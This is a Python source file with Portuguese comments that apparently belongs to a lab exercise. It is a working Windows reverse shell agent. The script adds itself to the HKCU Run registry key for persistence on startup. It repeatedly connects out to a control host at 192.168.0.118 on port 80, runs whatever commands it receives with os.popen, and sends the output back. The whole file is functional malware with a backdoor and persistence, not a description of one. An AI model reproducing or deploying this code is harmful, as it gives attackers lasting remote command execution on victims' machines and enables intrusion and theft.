import socket
import os
import sys
import time

# O módulo winreg é nativo do Python no Windows.
try:
    import winreg as reg
except ImportError:
    reg = None

class Intranet:
    def __init__(self):
        self.ip = "192.168.0.118"
        self.porta = 80
        self.intervalo_reconexao = 5
        self.nome_persistenca = "AgenteMonitoramentoLab"

    def garantir_persistencia(self):
        """
        Fase 1: Tenta registrar o caminho do script na chave 'Run' do Windows
        para garantir a inicialização automática com o sistema.
        """
        if reg is None:
            print("[-] Sistema operacional não suporta winreg (Não é Windows). Pulando persistência.")
            return

        try:
            caminho_atual = os.path.abspath(sys.argv[0])
            subchave_run = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            chave_aberta = reg.OpenKey(reg.HKEY_CURRENT_USER, subchave_run, 0, reg.KEY_WRITE)
            reg.SetValueEx(chave_aberta, self.nome_persistenca, 0, reg.REG_SZ, caminho_atual)
            reg.CloseKey(chave_aberta)
            print("[+] Configuração de persistência simulada com sucesso.")
            
        except Exception as erro:
            print(f"[-] Erro ao tentar interagir com o Registro: {erro}")

    def executar_comando(self, comando_str):
        """
        Executa o comando recebido. Trata o 'cd' internamente para 
        permitir a navegação persistente entre pastas.
        """
        try:
            # CORREÇÃO: Tratamento do comando de navegação 'cd'
            if comando_str.lower().startswith("cd "):
                nova_pasta = comando_str[3:].strip()
                os.chdir(nova_pasta)  # Altera o diretório do processo principal
                caminho_atual = os.getcwd()
                return f"[+] Diretório alterado para: {caminho_atual}\n".encode("utf-8")
            
            # Execução de comandos gerais
            resultado = os.popen(comando_str).read()
            if not resultado:
                return b"\n"
            return resultado.encode("utf-8")
            
        except Exception as erro:
            return f"[-] Erro ao executar comando: {erro}\n".encode("utf-8")

    def iniciar_conexao(self):
        """
        Fase 2 e 3: Gerenciamento de rede (TCP) com tolerância a falhas.
        """
        while True:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"[+] Tentando conectar a {self.ip}:{self.porta}...")
                
                sock.connect((self.ip, self.porta))
                print("[+] Conexão estabelecida com a máquina de controle.")
                
                while True:
                    dados_recebidos = sock.recv(1024)
                    
                    if not dados_recebidos:
                        print("[-] Conexão encerrada pelo servidor remoto.")
                        break
                    
                    comando_str = dados_recebidos.decode("utf-8").strip()
                    print(f"[*] Comando recebido: {comando_str}")
                    
                    if comando_str.lower() == "exit":
                        print("[*] Comando de saída recebido.")
                        break
                    
                    resposta_bytes = self.executar_comando(comando_str)
                    sock.sendall(resposta_bytes)
                        
            except (socket.error, Exception) as erro_rede:
                print(f"[-] Falha na comunicação: {erro_rede}")
                print(f"[*] Reiniciando ciclo de busca em {self.intervalo_reconexao} segundos...")
                time.sleep(self.intervalo_reconexao)
                
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass

    def rodar(self):
        print("[*] Iniciando análise do ciclo de vida do agente local (POO)...")
        self.garantir_persistencia()
        self.iniciar_conexao()

if __name__ == "__main__":
    agente = Intranet()
    agente.rodar()
